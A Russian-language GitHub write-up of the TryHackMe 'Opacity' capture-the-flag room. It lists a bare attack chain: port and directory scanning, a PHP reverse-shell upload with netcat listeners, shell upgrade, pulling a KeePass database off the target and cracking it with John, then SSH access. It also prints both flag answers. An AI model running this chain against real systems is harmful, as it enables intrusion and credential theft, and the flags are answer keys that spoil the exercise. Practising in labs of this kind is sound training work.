[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Opacity](https://tryhackme.com/r/room/opacity) 

Всего 1 заданиe:
## Задание 1
Opacity — это простая машина, которая может помочь вам в  процессе обучения тестированию на проникновение.

На машине есть 2 хэш-ключа (пользовательский - local.txt и корневой - proof.txt). Сможете ли вы их найти и стать root?

Совет: существует несколько способов выполнить действие; всегда анализируйте поведение приложения.

### Ответьте на вопросы ниже
Что такое флаг local.txt?
```commandline
nmap -sC -sV -p- <IP>
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://<IP>
http://<IP>/cloud/
/usr/share/webshells/php/php-reverse-shell.php
nc -nvlp 1234
python3 -c 'import pty;pty.spawn("/bin/bash");'
wget http://<IP>:8080/dataset.kdbx
keepass2john dataset.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlist/rockyou.txt
keepassxc dataset.kdbx
ssh sysadmin@<IP>
cat local.txt

```
```commandline
6661b61b44d234d230d06bf5b3c075e2
```
Что такое флаг proof.txt?
```commandline
nc -nvlp 1235
cat proof.txt
```
```commandline
ac0d56f93202dd57dcb2498c739fd20e
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)